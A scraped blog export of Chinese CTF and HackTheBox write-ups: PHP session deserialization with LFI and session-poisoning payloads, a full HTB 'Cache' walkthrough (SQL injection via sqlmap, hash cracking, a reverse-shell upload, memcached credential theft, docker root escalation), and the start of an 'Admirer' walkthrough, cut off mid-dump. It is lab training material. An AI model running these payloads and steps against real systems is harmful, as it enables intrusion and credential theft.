如果在这个session设置成功后，有其他的页面使用这个session，由于处理器的不同，就会导致安全问题。然而PHP自动注册Session会话是在脚本执行前，所以通过该方式只能注入PHP的内置类。 123&lt;?php// foo2.phpvar_dump($_SESSION); php.ini配置中session_use_trans_sid = 1才能跨页面访问SESSION session.auto_start=Off 当配置选项 session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码： 123456&lt;?php// foo1.phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;test&#x27;] = $_GET[&#x27;test&#x27;]; 1234567891011121314 &lt;?php // foo2.php session_start(); class test &#123; var $hi; function __wakeup() &#123; echo &#x27;hi&#x27;; &#125; function __destruct() &#123; echo $this-&gt;hi; &#125;&#125; 0x03 例题解析 2018 XCTF Final bestphp 题目环境：https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp 直接给出了index.php的源码： call_user_func()函数中的两个参数都是可控的，那么就可以回调extract()函数用户变量覆盖，进而读取本地文件： http://192.168.153.133:8003/?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=function.php 123456789&lt;?phpfunction filters($data)&#123; foreach($data as $key=&gt;$value)&#123; if(preg_match(&#x27;/eval|assert|exec|passthru|glob|system|popen/i&#x27;,$value))&#123; die(&#x27;Do not hack me!&#x27;); &#125; &#125;&#125;?&gt; http://192.168.153.133:8003/?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=admin.php 123456789hello admin&lt;?phpif(empty($_SESSION[&#x27;name&#x27;]))&#123; session_start(); #echo &#x27;hello &#x27; + $_SESSION[&#x27;name&#x27;];&#125;else&#123; die(&#x27;you must login with admin&#x27;);&#125;?&gt; 接下来主要讨论session漏洞利用问题session+lfi，由于代码： 1ini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html:/tmp&#x27;); 限制了我们无法直接去包含默认的路径： 1&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_phpsessid 常见的Session存储位置： /var/lib/php/sess_PHPSESSID /var/lib/php/sessions/sess_PHPSESSID /var/lib/php5/sess_PHPSESSID /var/lib/php5/sessions/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID 但是因为有变量覆盖因此可以通过session_start()，改变save_path的方式让session存储路径在open_basedir允许的目录下： 1?function&#x3D;session_start&amp;save_path&#x3D;&#x2F;tmp 然后去包含： 1?function&#x3D;extract&amp;file&#x3D;&#x2F;tmp&#x2F;sess_arfguipj1mthu7bkma10j0f5o3 这里有一个$_SESSION['name']，并且其可以被我们post的name复制，那这就可以达到控制session内容的目的。 使用Hackbar直接POST数据： 1name&#x3D;&lt;?&#x3D;phpinfo();?&gt; 再去包含对应的session： 1?function&#x3D;extract&amp;file&#x3D;&#x2F;tmp&#x2F;sess_arfguipj1mthu7bkma10j0f5o3 后面找到flag直接cat即可。 介绍另外一种思路：PHP7.0本地文件包含漏洞 包含自身从而导致死循环：https://xz.aliyun.com/t/3174#toc-4 jarvisoj PHPINFO 题目地址：http://web.jarvisoj.com:32784 在讲这道题之前，我们先来介绍一下session.upload_progress.enabled 当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &#x27;phpinfo();&#x27;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;]))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents(&#x27;index.php&#x27;));&#125;?&gt; 这道题涉及到两个知识点，第一个知识点就是PHP Session 序列化及反序列化处理器设置使用不当。我们可以看到，INI中默认的处理器是php_serialize，而程序使用的却是php处理器。 形成的原理就是在用session.serialize_handler = php_serialize存储的字符可以引入 | , 再用session.serialize_handler = php格式取出$_SESSION的值时， |会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。 第二个知识点就是Upload progress in sessions，当一个上传在处理中，同时 post 一个与 ini 设置的 session.upload_progress.name 同名变量时，php 检测到这种 post 请求时就会在 $SESSION 中添加一组数据，所以可通过 session.upload_progress 来设置 session。 首先构造一个上传表单： 12345&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 再构造exp： 1234567891011121314151617&lt;?php class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &#x27;phpinfo();&#x27;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;$a=new OowoO();$a-&gt;mdzz=&quot;var_dump(scandir(&#x27;./&#x27;));&quot;;echo serialize($a); 修改文件内容： 从phpinfo中可以看到网站的根目录在/opt/lampp/htdocs file_get_contents()读取文件 新春战役2020 hackme 贴上出题的kaixin师傅的writeup：https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme 没有复现环境，这里就主要说考察到的知识点： PHP Session反序列化 profile.php中session.serialize_handler用的是php，而init.php中设置的是php_serialize，这样就可以参考前面提到的PHP Session反序列化漏洞。 data协议以及4字命令注入 挖洞技巧：如何绕过URL限制 【CTF 攻略】如何绕过四个字符限制getshell 这个考点需要另外写一篇整理一下。 0x04 Reference Title Url 带你走进PHP session反序列化漏洞 https://xz.aliyun.com/t/6640 PHP反序列化总结 https://www.cnblogs.com/tr1ple/p/11156279.html#sna43nW4 PHP反序列化入门之session反序列化 https://mochazz.github.io/2019/01/29/PHP反序列化入门之session反序列化/#PHP的session机制 GYCTF Hackme http://www.pdsdt.lovepdsdt.com/index.php/2020/03/09/187/#Hackme","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHP反序列化","slug":"PHP反序列化","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"HTB::Cache Walkthrough","date":"2020-05-28T02:49:44.000Z","path":"Target_drone/HackTheBox/19.HackTheBox-Cache-walkthrough/","text":"HTB::Cache Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap cewl wfuzz sqlmap openEMR exploit memcached exploit docker priv 0x03 Pentesting Initial Enumeration nmap扫描 1234567891011121314151617# Nmap 7.80 scan initiated Wed May 20 16:58:59 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.188Nmap scan report for 10.10.10.188Host is up (0.29s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)| 256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)|_ 256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: CacheService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed May 20 17:00:01 2020 -- 1 IP address (1 host up) scanned in 61.63 seconds 80端口 主页没有什么有效信息，尝试暴力破解： 页面加载了functionality.js： 123456789101112131415161718192021222324252627282930313233343536$(function()&#123; var error_correctPassword = false; var error_username = false; function checkCorrectPassword()&#123; var Password = $(&quot;#password&quot;).val(); if(Password != &#x27;H@v3_fun&#x27;)&#123; alert(&quot;Password didn&#x27;t Match&quot;); error_correctPassword = true; &#125; &#125; function checkCorrectUsername()&#123; var Username = $(&quot;#username&quot;).val(); if(Username != &quot;ash&quot;)&#123; alert(&quot;Username didn&#x27;t Match&quot;); error_username = true; &#125; &#125; $(&quot;#loginform&quot;).submit(function(event) &#123; /* Act on the event */ error_correctPassword = false; checkCorrectPassword(); error_username = false; checkCorrectUsername(); if(error_correctPassword == false &amp;&amp; error_username ==false)&#123; return true; &#125; else&#123; return false; &#125; &#125;); &#125;); 有登录名和密码ash:H@v3_fun，成功登录之后也没有可以利用的点，再查看Author页面： 实在是没啥思路，去HTB forum私聊一下各位大佬，提示我用cewl工具提取Autor page’s information，以及FUZZ HOST。 后来才知道用这个页面的单词和cewl工具生成一个包含域名的字典： 123# kali @ kali in ~&#x2F;HackTheBox&#x2F;Cache [16:24:16]$ cewl -w wordlist.txt -d 10 -m 1 http:&#x2F;&#x2F;10.10.10.188&#x2F;author.htmlCeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https:&#x2F;&#x2F;digi.ninja&#x2F;) 用wfuzz查找域名： 12345678910111213141516171819202122# kali @ kali in ~&#x2F;HackTheBox&#x2F;Cache [16:52:57] $ wfuzz -w wordlist.txt -H &quot;HOST: FUZZ.htb&quot; -u http:&#x2F;&#x2F;10.10.10.188&#x2F; --hc 400 --hh 8193Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.********************************************************* Wfuzz 2.4.5 - The Web Fuzzer *********************************************************Target: http:&#x2F;&#x2F;10.10.10.188&#x2F;Total requests: 42&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;ID Response Lines Word Chars Payload&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;000000037: 302 0 L 0 W 0 Ch &quot;HMS&quot;Total time: 2.130227Processed Requests: 42Filtered Requests: 41Requests&#x2F;sec.: 19.71620 –hc 404 --hh 8193 这两个参数是为了限制一些无效的返回消息。 把HMS.htb加入到/etc/hosts文件中。 HMS.htb 弱口令无效，查找有没有公开的利用方式： 发现已经有很多不同版本的exploit，再尝试用OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution，运行之后提示要系统的账号和密码。Google OpenEMR，在YouTube上看到了一个SQL注入的相关漏洞。 https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s 根据视频的步骤，首先访问http://hms.htb/portal 点击Register后访问http://hms.htb/portal/add_edit_event_user.php，这里的eid参数存在SQL注入： 用burp拦截请求，并且把请求数据保存到req.txt： 12345678910GET &#x2F;portal&#x2F;add_edit_event_user.php?eid&#x3D;1 HTTP&#x2F;1.1Host: hms.htbUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8Accept-Language: en-US,en;q&#x3D;0.5Accept-Encoding: gzip, deflateConnection: closeCookie: OpenEMR&#x3D;0bcd8bfgl4rl2sfc8qmg63u09b; PHPSESSID&#x3D;juj09jki6pu38k34afv60j3vb9Upgrade-Insecure-Requests: 1Cache-Control: max-age&#x3D;0 dump database 用sqlmap爆破数据库： 123456789$ sqlmap -r req.txt --dbs --batch[11:52:46] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.1[11:52:46] [INFO] fetching database names[11:52:47] [INFO] retrieved: &#x27;information_schema&#x27;[11:52:48] [INFO] retrieved: &#x27;openemr&#x27;available databases [2]: [*] information_schema[*] openemr 然后接着就是sqlmap一把梭，找到users_secure数据表，查看username和password字段，dump 123456789[12:03:13] [INFO] fetching entries of column(s) &#39;&#96;password&#96;, username&#39; for table &#39;users_secure&#39; in database &#39;openemr&#39;Database: openemrTable: users_secure[1 entry]+---------------+--------------------------------------------------------------+| username | password |+---------------+--------------------------------------------------------------+| openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |+---------------+--------------------------------------------------------------+ 用john爆破hash密码： 1234567891011# kali @ kali in ~/HackTheBox/Cache [12:11:02] $ sudo john -w=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 32 for all loaded hashesWill run 4 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusxxxxxx (?)1g 0:00:00:00 DONE (2020-05-27 12:11) 1.694g/s 1464p/s 1464c/s 1464C/s tristan..felipeUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed 得到登录用户名和密码：openemr_admin:xxxxxx。 upload reverse shell 通过Administration-&gt;Files模块上传reverse shell，写入letter_templates/custom_pdf.php文件中： 本机监听4444端口，浏览器访问http://hms.htb/sites/default/letter_templates/custom_pdf.php 12345678$ sudo nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.2] from (UNKNOWN) [10.10.10.188] 54188bash: cannot set terminal process group (2111): Inappropriate ioctl for devicebash: no job control in this shellwww-data@cache:/var/www/hms.htb/public_html/sites/default/letter_templates$ id&lt;.htb/public_html/sites/default/letter_templates$ iduid=33(www-data) gid=33(www-data) groups=33(www-data) Getting User Access 用functionality.js中的登录凭证切换ash用户： 123456789www-data@cache:/var/www$ su ashsu ashPassword: H@v3_funash@cache:/var/www$ ididuid=1000(ash) gid=1000(ash) groups=1000(ash)ash@cache:~$ cat user.txtcat user.txt93bf------------------------8dfe memcached exploit 查看本地运行服务： 12345678910111213ash@cache:~$ netstat -tulpnnetstat -tulpn(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - 11211端口是运行memcached服务，利用方式： https://www.hackingarticles.in/penetration-testing-on-memcached-server/ https://niiconsulting.com/checkmate/2013/05/memcache-exploit/ fetch the slab statistics： 1234567891011121314151617181920212223242526ash@cache:~$ telnet 127.0.0.1 11211telnet 127.0.0.1 11211Trying 127.0.0.1...Connected to 127.0.0.1.Escape character is &#x27;^]&#x27;stats slabsstats slabsSTAT 1:chunk_size 96STAT 1:chunks_per_page 10922STAT 1:total_pages 1STAT 1:total_chunks 10922STAT 1:used_chunks 5STAT 1:free_chunks 10917STAT 1:free_chunks_end 0STAT 1:mem_requested 371STAT 1:get_hits 1STAT 1:cmd_set 7730STAT 1:delete_hits 0STAT 1:incr_hits 0STAT 1:decr_hits 0STAT 1:cas_hits 0STAT 1:cas_badval 0STAT 1:touch_hits 0STAT active_slabs 1STAT total_malloced 1048576END 通过slab id查看组织结构items： 123456789101112131415161718192021222324252627282930stats itemsstats itemsSTAT items:1:number 5STAT items:1:number_hot 0STAT items:1:number_warm 0STAT items:1:number_cold 5STAT items:1:age_hot 0STAT items:1:age_warm 0STAT items:1:age 52STAT items:1:evicted 0STAT items:1:evicted_nonzero 0STAT items:1:evicted_time 0STAT items:1:outofmemory 0STAT items:1:tailrepairs 0STAT items:1:reclaimed 0STAT items:1:expired_unfetched 0STAT items:1:evicted_unfetched 0STAT items:1:evicted_active 0STAT items:1:crawler_reclaimed 0STAT items:1:crawler_items_checked 220STAT items:1:lrutail_reflocked 0STAT items:1:moves_to_cold 7735STAT items:1:moves_to_warm 0STAT items:1:moves_within_lru 0STAT items:1:direct_reclaims 0STAT items:1:hits_to_hot 0STAT items:1:hits_to_warm 0STAT items:1:hits_to_cold 1STAT items:1:hits_to_temp 0END dump all the keys： 12345678stats cachedump 1 0stats cachedump 1 0ITEM link [21 b; 0 s]ITEM user [5 b; 0 s]ITEM passwd [9 b; 0 s]ITEM file [7 b; 0 s]ITEM account [9 b; 0 s]END 读取user和passwd 12345678910get userget userVALUE user 0 5luffyENDget passwdget passwdVALUE passwd 0 90n3_p1ec3END SSH登录： 12345678$ ssh luffy@10.10.10.188The authenticity of host &#x27;10.10.10.188 (10.10.10.188)&#x27; can&#x27;t be established.ECDSA key fingerprint is SHA256:/qQ34g2zzGVlmbMIKeD7JhlhDf/SPzgYFz000v+3KBI.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;10.10.10.188&#x27; (ECDSA) to the list of known hosts.luffy@10.10.10.188&#x27;s password:luffy@cache:~$ iduid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker) 观察到luffy是属于docker用户组。 Getting Root Access GTFObins docker 查看docker镜像 123luffy@cache:~$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEubuntu latest 2ca708c1c9cc 8 months ago 64.2MB 照着GTFObins给的方法进行提权： 123456luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bashroot@2b2647044657:/# iduid=0(root) gid=0(root) groups=0(root)root@2b2647044657:/# cd root@2b2647044657:~# cat root.txt32fc------------------------ceab 0x04 Reference Topic Url OpenEmr Vulnerability ( video) https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s Memecache https://www.hackingarticles.in/penetration-testing-on-memcached-server/ Memcacahe https://niiconsulting.com/checkmate/2013/05/memcache-exploit/ Docker https://gtfobins.github.io/gtfobins/docker/","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"HTB","permalink":"http://ca0y1h.top/tags/HTB/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HTB::Admirer-walkthrough","date":"2020-05-21T13:09:53.000Z","path":"Target_drone/HackTheBox/18.HTB-Admirer-walkthrough/","text":"HTB::Admirer Walkthrough 文章首发于 星盟安全 公众号 0x01 Info Card 0x02 Tool and Tips nmap wfuzz adminer exploit python libaray path hijack 0x03 Pentesting Inital Enumeration 端口扫描 123456789101112131415161718192021$ nmap -Pn -A -T4 -p- 10.10.10.187Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-19 21:49 CESTNmap scan report for 10.10.10.187Host is up (0.014s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION21&#x2F;tcp open ftp vsftpd 3.0.322&#x2F;tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)| ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)| 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)|_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.25 ((Debian))| http-robots.txt: 1 disallowed entry |_&#x2F;admin-dir|_http-server-header: Apache&#x2F;2.4.25 (Debian)|_http-title: AdmirerService Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds FTP不允许匿名登录 1234567➜ admirer ftp admirer.htb Connected to admirer.htb.220 (vsFTPd 3.0.3)Name (admirer.htb:prashant): anonymous530 Permission denied.Login failed.ftp&gt; 访问10.10.10.187/admin-dir返回403 Forbidden，用wfuzz工具扫描目录 12345678910111213141516171819202122$ wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;big.txt -z list,txt-php-html -u http:&#x2F;&#x2F;10.10.10.187&#x2F;admin-dir&#x2F;FUZZ.FUZ2Z --hc 404,403 -t 100Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.********************************************************* Wfuzz 2.4.5 - The Web Fuzzer *********************************************************Target: http:&#x2F;&#x2F;10.10.10.187&#x2F;admin-dir&#x2F;FUZZ.FUZ2ZTotal requests: 61419&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;ID Response Lines Word Chars Payload&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;000015592: 200 29 L 39 W 350 Ch &quot;contacts - txt&quot;000016327: 200 11 L 13 W 136 Ch &quot;credentials - txt&quot;Total time: 247.8061Processed Requests: 61419Filtered Requests: 61417Requests&#x2F;sec.: 247.8509 contact.txt 123456789101112131415161718########### admins ############ PennyEmail: p.wise@admirer.htb############### developers ################ RajeshEmail: r.nayyar@admirer.htb# AmyEmail: a.bialik@admirer.htb# LeonardEmail: l.galecki@admirer.htb credential.txt 123456789101112131415[Bank Account]waldo.11Ezy]m27&#125;OREc$[Internal mail account]w.cooper@admirer.htbfgJr6q#S\\W:$P[FTP account]ftpuser%n?4Wz&#125;R$tTF7[Wordpress account]adminw0rdpr3ss01! 用FTP account登录FTP服务器： 1234567891011121314ftp 10.10.10.187Connected to admirer.htb.220 (vsFTPd 3.0.3)Name (10.10.10.187:kali): ftpuser331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; lsdump.sqlhtml.tar.gzftp&gt; get dump.sqlftp&gt; get html.tar.gz dump.sql 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354-- MySQL dump 10.16 Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)---- Host: localhost Database: admirerdb-- -------------------------------------------------------- Server version 10.1.41-MariaDB-0+deb9u1&#x2F;*!40101 SET @OLD_CHARACTER_SET_CLIENT&#x3D;@@CHARACTER_SET_CLIENT *&#x2F;;&#x2F;*!40101 SET @OLD_CHARACTER_SET_RESULTS&#x3D;@@CHARACTER_SET_RESULTS *&#x2F;;&#x2F;*!40101 SET @OLD_COLLATION_CONNECTION&#x3D;@@COLLATION_CONNECTION *&#x2F;;&#x2F;*!40101 SET NAMES utf8mb4 *&#x2F;;&#x2F;*!40103 SET @OLD_TIME_ZONE&#x3D;@@TIME_ZONE *&#x2F;;&#x2F;*!40103 SET TIME_ZONE&#x3D;&#39;+00:00&#39; *&#x2F;;&#x2F;*!40014 SET @OLD_UNIQUE_CHECKS&#x3D;@@UNIQUE_CHECKS, UNIQUE_CHECKS&#x3D;0 *&#x2F;;&#x2F;*!40014 SET @OLD_FOREIGN_KEY_CHECKS&#x3D;@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS&#x3D;0 *&#x2F;;&#x2F;*!40101 SET @OLD_SQL_MODE&#x3D;@@SQL_MODE, SQL_MODE&#x3D;&#39;NO_AUTO_VALUE_ON_ZERO&#39; *&#x2F;;&#x2F;*!40111 SET @OLD_SQL_NOTES&#x3D;@@SQL_NOTES, SQL_NOTES&#x3D;0 *&#x2F;;---- Table structure for table &#96;items&#96;--DROP TABLE IF EXISTS &#96;items&#96;;&#x2F;*!40101 SET @saved_cs_client &#x3D; @@character_set_client *&#x2F;;&#x2F;*!40101 SET character_set_client &#x3D; utf8 *&#x2F;;CREATE TABLE &#96;items&#96; ( &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT, &#96;thumb_path&#96; text NOT NULL, &#96;image_path&#96; text NOT NULL, &#96;title&#96; text NOT NULL, &#96;text&#96; text, PRIMARY KEY (&#96;id&#96;)) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;13 DEFAULT CHARSET&#x3D;utf8mb4;&#x2F;*!40101 SET character_set_client &#x3D; @saved_cs_client *&#x2F;;---- Dumping data for table &#96;items&#96;--LOCK TABLES &#96;items&#96; WRITE;&#x2F;*!40000 ALTER TABLE &#96;items&#96; DISABLE KEYS *&#x2F;;INSERT INTO &#96;items&#96; VALUES (1,&#39;images&#x2F;thumbs&#x2F;thmb_art01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;art01.jpg&#39;,&#39;Visual Art&#39;,&#39;A pure showcase of skill and emotion.&#39;),(2,&#39;images&#x2F;thumbs&#x2F;thmb_eng02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;eng02.jpg&#39;,&#39;The Beauty and the Beast&#39;,&#39;Besides the technology, there is also the eye candy...&#39;),(3,&#39;images&#x2F;thumbs&#x2F;thmb_nat01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;nat01.jpg&#39;,&#39;The uncontrollable lightshow&#39;,&#39;When the sun decides to play at night.&#39;),(4,&#39;images&#x2F;thumbs&#x2F;thmb_arch02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;arch02.jpg&#39;,&#39;Nearly Monochromatic&#39;,&#39;One could simply spend hours looking at this indoor square.&#39;),(5,&#39;images&#x2F;thumbs&#x2F;thmb_mind01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mind01.jpg&#39;,&#39;Way ahead of his time&#39;,&#39;You probably still use some of his inventions... 500yrs later.&#39;),(6,&#39;images&#x2F;thumbs&#x2F;thmb_mus02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mus02.jpg&#39;,&#39;The outcomes of complexity&#39;,&#39;Seriously, listen to Dust in Interstellar\\&#39;s OST. Thank me later.&#39;),(7,&#39;images&#x2F;thumbs&#x2F;thmb_arch01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;arch01.jpg&#39;,&#39;Back to basics&#39;,&#39;And centuries later, we want to go back and live in nature... Sort of.&#39;),(8,&#39;images&#x2F;thumbs&#x2F;thmb_mind02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mind02.jpg&#39;,&#39;We need him back&#39;,&#39;He might have been a loner who allegedly slept with a pigeon, but that 